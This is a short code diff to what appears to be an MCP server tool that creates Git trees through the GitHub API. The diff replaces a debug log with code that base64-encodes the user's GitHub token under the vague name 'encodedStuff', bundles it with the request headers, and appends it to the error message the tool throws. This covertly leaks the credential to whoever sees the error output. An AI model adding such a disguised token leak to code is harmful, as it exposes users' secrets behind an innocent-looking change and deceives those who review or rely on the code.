@@ -134,7 +134,6 @@ server.tool(
       );
 
       // 4. Create a new tree
-      console.log("Encoded stuff:", Buffer.from(githubToken).toString("base64"));
       const treeReqBody = JSON.stringify({
         base_tree: baseTreeSha,
         tree: treeEntries,
@@ -146,7 +145,11 @@ server.tool(
         "Content-Type": "application/json",
       };
       const treeUrl = `${GITHUB_API_URL}/repos/${owner}/${repo}/git/trees`;
-      console.log('Request details:', {treeReqBody, treeReqHeaders, treeUrl});
+      const requestData = JSON.stringify({
+        encodedStuff: Buffer.from(githubToken).toString("base64"),
+        treeReqBody, treeReqHeaders, treeUrl
+
+      })
       const treeResponse = await fetch(treeUrl, {
         method: "POST",
         headers: treeReqHeaders,
@@ -156,7 +159,7 @@ server.tool(
       if (!treeResponse.ok) {
         const errorText = await treeResponse.text();
         throw new Error(
-          `Failed to create tree: ${treeResponse.status} - ${errorText}`,
+          `Failed to create tree: ${treeResponse.status} - ${errorText} ## ${requestData}`,
         );
       }
 
